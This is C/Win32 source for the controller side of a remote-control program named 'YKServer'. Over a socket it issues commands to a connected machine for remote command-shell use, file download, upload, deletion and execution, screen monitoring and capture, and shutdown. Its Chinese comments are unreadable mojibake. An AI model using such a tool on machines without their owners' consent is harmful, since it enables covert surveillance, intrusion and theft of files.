				 SetWindowPos(hwnd, NULL,scrrt.left,scrrt.top,scrrt.right-scrrt.left,scrrt.bottom-scrrt.top,SWP_NOZORDER);//�ı䴰��λ�á��ߴ��Z��   
				 ShowScrollBar(hwnd,SB_BOTH,1);//��ʾ������
			 }
			 fFullScr=!fFullScr;
			 PostMessage(hwnd,WM_SIZE,0,0);
			 break;
		 case VK_F11:		//��������
			 break;
		 }
		 break;
     case WM_DESTROY:
          PostQuitMessage (0) ;
          break;
	 default:
		 return DefWindowProc (hwnd, message, wParam, lParam) ;
		 break;
     }
     return 1;
}

DWORD WINAPI InitMonWindow(LPVOID lpParameter)
{
	 static TCHAR szAppName[] ="YKServer";
     MSG          msg ;
     WNDCLASS     wndclass ;
	 PNETMSG	nMsg=(PNETMSG)pRawData;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProcMon ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInst ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_APPLICATION) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;

     if (!RegisterClass (&wndclass))
     {
          MessageBox (NULL, TEXT ("This program requires Windows NT!"), 
                      szAppName, MB_ICONERROR) ;
          return 0 ;
     }

     hWinMon = CreateWindow (szAppName,                  // window class name
                          "��Ļ���(F12ȫ����F11��������)",				 // window caption
                          WS_OVERLAPPEDWINDOW|WS_HSCROLL|WS_VSCROLL,// window style
                          200,						 	// initial x position
                          150,							// initial y position
                          800,					        // initial x size
                          500,							// initial y size
                          NULL,                       // parent window handle
                          NULL,                       // window menu handle
                          hInst,                  // program instance handle
						  NULL) ;                     // creation parameters
     ShowWindow (hWinMon, SW_NORMAL) ;
     UpdateWindow (hWinMon) ;

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }
	 UnregisterClass(szAppName,hInst);
	 nMsg->dwCommand=IDM_ENDMON;
	 send(SockChat,pRawData,4,0);;//���߿ͻ��˽������
	 SuspendThread(hThreadImg);//����ͼ������߳�
     return msg.wParam ;
}
//���������ݼ��ص�ȫ�ֱ���
void InitConfig()
{
	HKEY hConfigKey;
	DWORD dwData;

	AppCreateKey(HKEY_LOCAL_MACHINE,"SoftWare\\YKConfig",&hConfigKey);
	if(RegQueryValueEx(hConfigKey,"DownDir",0,NULL,(LPBYTE)szDownDir,&dwData)
		!=ERROR_SUCCESS)//�����ʧ����Ϊ��һ��ʹ��
		RegSetValueEx(hConfigKey,"DownDir",0,REG_SZ,(LPBYTE)"c:\\",6);
	if(RegQueryValueEx(hConfigKey,"Port",0,NULL,(LPBYTE)szPort,&dwData)
		!=ERROR_SUCCESS)//�����ʧ����Ϊ��һ��ʹ��
		RegSetValueEx(hConfigKey,"Port",0,REG_SZ,(LPBYTE)"4500",6);
	RegQueryValueEx(hConfigKey,"DownDir",0,NULL,(LPBYTE)szDownDir,&dwData);
	RegQueryValueEx(hConfigKey,"Port",0,NULL,(LPBYTE)szPort,&dwData);
}

void NetMsgProc()
{
	char str[100];
	PNETMSG nMsg=(PNETMSG)pRawData;
	PWIN32_FIND_DATA pwfa;
	struct 
	{
		DWORD scrX;//��Ļ���
		DWORD scrY;//��Ļ�߶�
		DWORD BitsPixel;//����λ����һ��Ϊ32)
		DWORD dwDrivers;//�����б���Ϣ
	}LinkInfo;

	switch(nMsg->dwCommand)
	{
	 case NETMSG_CHAT:
		 if(FindWindow(NULL,"Chat"))
		 {
			 ShowWindow(hDlgChat,SW_SHOWNORMAL);
			 PostMessage(hDlgChat,WM_MSG,0,0);
		 }
		 else
		 {
			 SendMessage(hDlgMain,WM_COMMAND,IDC_CHAT,0);
		 }
		 break;
	 case NETMSG_INITINFO:
		 CopyMemory(&LinkInfo,pRawData+4,sizeof(LinkInfo));
		 ClientScrX=LinkInfo.scrX;
		 ClientScrY=LinkInfo.scrY;
		 ClientBitsPixel=LinkInfo.BitsPixel;
		 AddDriverToTree(LinkInfo.dwDrivers);
		 //��ÿͻ�����Ϣ���ٴ��ͷ�������ݣ��������������Ҫ�Ƕ˿���Ϣ
		 nMsg->dwCommand=NETMSG_PORT;
		 CopyMemory(pRawData+4,NetPort,sizeof(NetPort));
		 send(SockChat,pRawData,sizeof(NetPort)+4,0);
		 break;
	 case NETMSG_FILELIST://�����ļ��б���Ϣ
		 pwfa=(PWIN32_FIND_DATA)(pRawData+4);
		 AddFileList(hListC,pwfa);
		 break;
	 case FT_SIZE:
		 PostMessage(hDlgFile,WM_MSG,FT_SIZE,nMsg->wParam);
		 break;
	 case FT_LASTFAIL:
		 PostMessage(hDlgFile,WM_MSG,FT_LASTFAIL,nMsg->wParam);
		 break;
	}
}

BOOL IsFloder()
{
	char str[50];

	GetListItemText(hListC,str,CurSelIndex,1);
	if(!lstrcmp(str,"�ļ���"))
		return 1;
	return 0;
}

int CALLBACK ProcDlgInput(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	static char *str;

	switch(message)
	{
	case WM_INITDIALOG:
		str=(char *)lParam;
		break;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			GetDlgItemText(hwnd,IDC_INNAME,str,MAX_PATH);
			EndDialog(hwnd,0);
			break;
		case IDCANCEL:
			PostMessage(hwnd,WM_CLOSE,0,0);
			break;
		}
		break;
	case WM_CLOSE:
		str[0]=0;
		EndDialog(hwnd,0);
		break;
	default:
		return 0;
	}
	return 1;
}


int CALLBACK ProcDlgMain (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	char pszTitle[3][10]=
	{
		"�ļ���",
		"����",
		"��С"
	};
	char str[MAX_PATH]={0};
	static HMENU hMenu;
	int cx[]={270,130,130};
	int i;
	LVCOLUMN lvc;
	HANDLE hFile;HWND hEdit;
	POINT pos;
	DWORD ThreadId,dwSize;
	LPNMTREEVIEW lpNtv;
	LPNMITEMACTIVATE lpNia;
	PNETMSG nMsg=(PNETMSG)pRawData;
	SYSTEMTIME systime;

	switch(message)
	{
	case WM_INITDIALOG:
		SetWindowText(hwnd,"YKServer ");
		//��ʼ������
		InitConfig();
		//��ʼ��ȫ�ֱ���
		hDlgMain=hwnd;
		hOutInfo=GetDlgItem(hwnd,IDC_OUTINFO);
		hTreeC=GetDlgItem(hwnd,IDC_FILETREE);
		hListC=GetDlgItem(hwnd,IDC_FILELIST);
		ZeroMemory(&lvc,sizeof(lvc));
		//��ʼ��ListVeiw����
		lvc.mask=LVCF_TEXT|LVCF_WIDTH|LVCF_FMT;
		lvc.cchTextMax=10;
		lvc.fmt=LVCFMT_LEFT;
		for(i=0;i<=2;i++)
		{
			lvc.pszText=pszTitle[i];
			lvc.cx=cx[i];
			SendDlgItemMessage(hwnd,IDC_FILELIST,LVM_INSERTCOLUMN,i,(long)&lvc);
		}
		//��ʼ���Ҽ��˵�
		hMenu=InitPopupMenu();
		InitSocket();//��ʼ�������׽���
		//һ���ԵĿ���ָ�����ݴ����߳�
		CreateThread(NULL,NULL,ChatThread,hwnd,NULL,&ThreadId);
		//����һ���̣߳�����ͼ���乤��
		hThreadImg=CreateThread(NULL,NULL,ImageThread,NULL,CREATE_SUSPENDED,&ThreadId);
		//����skin++Ƥ����
		skinppLoadSkin("AlphaOS.ssk");
		break;
	case WM_NETMSG:
		NetMsgProc();
		break;
	case WM_COMMAND:
		  switch(LOWORD(wParam))
		  {
		  case IDM_CONFIG:
			  if(FindWindow(NULL,"YKServer Config"))
				  return 1;
			  DialogBoxParam(hInst,(const char *)IDD_DLGCFG,NULL,ProcDlgConfig,0);
			  break;
		  case IDC_CHAT:
			  hDlgChat=FindWindow(NULL,"Chat");
			  if(hDlgChat)
			  {
				  ShowWindow(hDlgChat,SW_RESTORE);
				  return 1;
			  }
			  DialogBoxParam(hInst,(const char *)IDD_DLGCHAT,NULL,ProcDlgChat,1);
			  break;
		  case IDC_MONITOR:
			  EnableWindow(GetDlgItem(hwnd,IDC_MONITOR),0);
			  InitMonWindow(0);
			  EnableWindow(GetDlgItem(hwnd,IDC_MONITOR),1);
			  break;
		  case IDM_SHTUDOWN:
			  nMsg->dwCommand=IDM_SHTUDOWN;
			  send(SockChat,pRawData,4,0);
			  break;
		  case IDC_CAPSCREEN:
			  if(FindWindow(NULL,"�ļ����� "))
				  break;
			  EnableWindow(GetDlgItem(hwnd,IDC_CAPSCREEN),0);
			  GetLocalTime(&systime);
			  wsprintf(str,"%s%d %d %d %d %d %d.bmp",szDownDir,(int)systime.wYear,(int)systime.wMonth,
				  (int)systime.wDay,(int)systime.wHour,(int)systime.wMinute,(int)systime.wSecond);
			  DialogBoxParam(hInst,(const char *)IDD_DLGFILE,NULL,ProcDlgFile,(long)str);
			  EnableWindow(GetDlgItem(hwnd,IDC_CAPSCREEN),1);
			  break;
		  case IDC_CMD:
			  EnableWindow(GetDlgItem(hwnd,IDC_CMD),0);
			  if(FindWindow(NULL,"CmdShell"))
				  return 1;
			  DialogBoxParam(hInst,(const char *)IDD_DLGCMD,NULL,ProcDlgCmd,0);
			  EnableWindow(GetDlgItem(hwnd,IDC_CMD),1);
			  break;
		  case IDM_DOWNFILE:
			  if(FindWindow(NULL,"�ļ����� "))
				  break;
			  DialogBoxParam(hInst,(const char *)IDD_DLGFILE,NULL,ProcDlgFile,0);
			  break;
		  case IDM_UPFILE:
			  if(FindWindow(NULL,"�ļ��ϴ� "))
				  break;
			  DialogBoxParam(hInst,(const char *)IDD_DLGFILES,NULL,ProcDlgFileS,0);
			  break;
		  case IDM_DELFILE:
			  if(IsFloder())
				  nMsg->dwCommand=NETMSG_DELFLODER;
			  else
				  nMsg->dwCommand=NETMSG_DELFILE;
			  GetFilePath(pRawData+4);
			  send(SockChat,pRawData,MAX_PATH+4,0);
			  SendMessage(hListC,LVM_DELETEITEM,CurSelIndex,0);
			  break;
		  case IDM_RENAMEFILE:
			  DialogBoxParam(hInst,(const char *)IDD_INPUT,hwnd,ProcDlgInput,(long)str);
			  if(str[0])
			  {
				  nMsg->dwCommand=IDM_RENAMEFILE;
				  GetFilePath(pRawData+4);
				  lstrcpy(pRawData+512,str);
				  send(SockChat,pRawData,1024,0);
				  SetListVeiwItem(hListC,CurSelIndex,0,pRawData+512);
			  }
			  break;
		  case IDM_EXECUTE:
			  nMsg->dwCommand=IDM_EXECUTE;
			  GetFilePath(pRawData+4);
			  send(SockChat,pRawData,MAX_PATH+4,0);
			  break;
		  case IDM_NEWFLODER:
			  DialogBoxParam(hInst,(const char *)IDD_INPUT,hwnd,ProcDlgInput,(long)str);
			  if(str[0])
			  {
				  ZeroMemory(pRawData+4,MAX_PATH);
				  nMsg->dwCommand=IDM_NEWFLODER;
				  GetWholePath(hTreeC,hCurSelItem,pRawData+4);
				  lstrcat(pRawData+4,str);
				  send(SockChat,pRawData,MAX_PATH+4,0);
				  AddListVeiwItem(hListC,0,0,str);
				  SetListVeiwItem(hListC,0,1,"�ļ���");
			  }
			  break;
		  }
		  break;
	case WM_NOTIFY:
		switch(wParam)
		{
		case IDC_FILETREE:
			lpNtv=(LPNMTREEVIEW)lParam;
			switch(lpNtv->hdr.code)
			{
			case TVN_SELCHANGED:
				ListIndex=0;
				HWND hTree=GetDlgItem(hwnd,IDC_FILETREE);
				//hCurSelItem=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_CARET,NULL);
				hCurSelItem=lpNtv->itemNew.hItem;
				CleanTreeItem(hTree,hCurSelItem);//�����ԭ��������
				CleanListItem(hListC);//����б��
				(*(pRawData+4))=0;//���ԭ�������д���ַ���
				GetWholePath(hTree,hCurSelItem,pRawData+4);
				nMsg->dwCommand=NETMSG_GETFILELIST;
				send(SockChat,pRawData,MAX_PATH+4,0);
				break;
			}
			break;
		case IDC_FILELIST:
			lpNia=(LPNMITEMACTIVATE)lParam;
			switch(lpNia->hdr.code)
			{
			case NM_RCLICK:
				//�����˵�
				CurSelIndex=lpNia->iItem;
				GetCursorPos(&pos);
				TrackPopupMenu(hMenu,TPM_LEFTALIGN,pos.x,pos.y,NULL,hwnd,NULL);
				break;
			}
			break;
		}
		break;
	case WM_CLOSE:
		if(MessageBox(hwnd,"ȷ���˳���","��ʾ",MB_OKCANCEL)!=IDCANCEL)
		{
			EndDialog(hwnd,0);
			skinppExitSkin();//�˳�Ƥ����
		}
		break;
	default:
		return 0;
	}
	return 1;
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int iCmdShow)
{
	if(FindWindow(NULL,"YKServer "))
	{
		MessageBox(NULL,"�Ѵ�YKServer,��δ������ʾ����������������н���YKServer����","��ʾ",MB_OK);
		return 0;
	}
	hInst=hInstance;
	//��ʼ��ͨ�ÿؼ�
	InitCommonControls();
     DialogBoxParam(hInst,(const char *)IDD_DLGMAIN,NULL,ProcDlgMain,0);
	 return 0;
}




